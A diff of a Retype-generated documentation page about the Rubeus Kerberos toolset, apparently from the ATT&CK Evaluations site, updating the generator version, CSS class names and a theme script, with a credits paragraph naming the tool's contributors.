@@ -7,10 +7,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/ael">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.8.1.800553374803">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807110018169">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.8.1">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Rubeus</title>
@@ -32,29 +32,29 @@
     <meta property="twitter:title" content="Rubeus">
     <meta property="twitter:description" content="Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
     <link href="../../../../../favicon.png" rel="icon">
-    <link href="../../../../../resources/css/retype.css?v=3.8.1.800553374803" rel="stylesheet">
+    <link href="../../../../../resources/css/retype.css?v=3.11.0.807110018169" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../../resources/js/config.js?v=3.8.1.800553374803" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../../resources/js/retype.js?v=3.8.1" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../../resources/js/lunr.js?v=3.8.1.800553374803" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../../resources/js/config.js?v=3.11.0.807110018169" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../../resources/js/lunr.js?v=3.11.0.807110018169" data-turbo-eval="false" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../../" class="flex items-center leading-snug text-xl">
+                        <a id="retype-branding-logo" href="../../../../../" class="flex items-center leading-snug text-xl">
                             <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                 <img class="max-h-10 dark:hidden md:inline-block" src="../../../../../images/attackevals-logo.png">
                                 <img class="max-h-10 hidden dark:inline-block" src="../../../../../images/attackevals-logo.png">
@@ -63,15 +63,15 @@
                         </a>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                             </li>
         
                         </ul>
@@ -85,7 +85,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -103,7 +103,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -113,21 +113,22 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
             </div>
@@ -135,13 +136,13 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                     </li>
             
                                 </ul>
@@ -151,15 +152,15 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
-                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <nav id="retype-breadcrumb" class="breadcrumb" aria-label="Breadcrumb">
                                     <ol role="list">
                                         <li class="pr-4">
                                             <a href="../../../../../" class="pr-4">
@@ -216,18 +217,18 @@
         <span>Rubeus</span>
     </h1>
 </doc-anchor-target>
-<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
     <div>In&nbsp;</div>
     <div><a href="../../categories/enterprise/">enterprise</a></div>
 </div>
 
 <hr>
-<p>Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is <strong>heavily</strong> adapted from <a href="https://twitter.com/gentilkiwi" class="outbound" target="_blank"><span>Benjamin Delpy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project (CC BY-NC-SA 4.0 license) and <a href="https://twitter.com/mysmartlogon" class="outbound" target="_blank"><span>Vincent LE TOUX</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/vletoux/MakeMeEnterpriseAdmin" class="outbound" target="_blank"><span>MakeMeEnterpriseAdmin</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.</p>
-<p><a href="https://twitter.com/exploitph" class="outbound" target="_blank"><span>Charlie Clark</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://twitter.com/_EthicalChaos_" class="outbound" target="_blank"><span>Ceri Coburn</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> have both made <em>significant</em> contributions to the Rubeus codebase. <a href="https://twitter.com/elad_shamir" class="outbound" target="_blank"><span>Elad Shamir</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> contributed some essential work for resource-based constrained delegation. Their work is very appreciated!</p>
-<p>Rubeus also uses a C# ASN.1 parsing/encoding library from <a href="https://github.com/pornin" class="outbound" target="_blank"><span>Thomas Pornin</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> named <a href="https://github.com/pornin/DDer" class="outbound" target="_blank"><span>DDer</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> that was released with an &quot;MIT-like&quot; license. Huge thanks to Thomas for his clean and stable code!</p>
-<p>PKINIT code heavily adapted from <a href="https://twitter.com/SteveSyfuhs" class="outbound" target="_blank"><span>@SteveSyfuhs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/dotnet/Kerberos.NET" class="outbound" target="_blank"><span>Bruce</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!</p>
-<p>The <a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx" class="outbound" target="_blank"><span>KerberosRequestorSecurityToken.GetRequest</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> method for Kerberoasting was contributed to PowerView (and then incorporated into Rubeus) by <a href="https://twitter.com/machosec" class="outbound" target="_blank"><span>@machosec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
-<p><a href="https://twitter.com/harmj0y" class="outbound" target="_blank"><span>@harmj0y</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> is the primary author of this code base.</p>
+<p>Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is <strong>heavily</strong> adapted from <a href="https://twitter.com/gentilkiwi" class="outbound" target="_blank"><span>Benjamin Delpy</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project (CC BY-NC-SA 4.0 license) and <a href="https://twitter.com/mysmartlogon" class="outbound" target="_blank"><span>Vincent LE TOUX</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/vletoux/MakeMeEnterpriseAdmin" class="outbound" target="_blank"><span>MakeMeEnterpriseAdmin</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.</p>
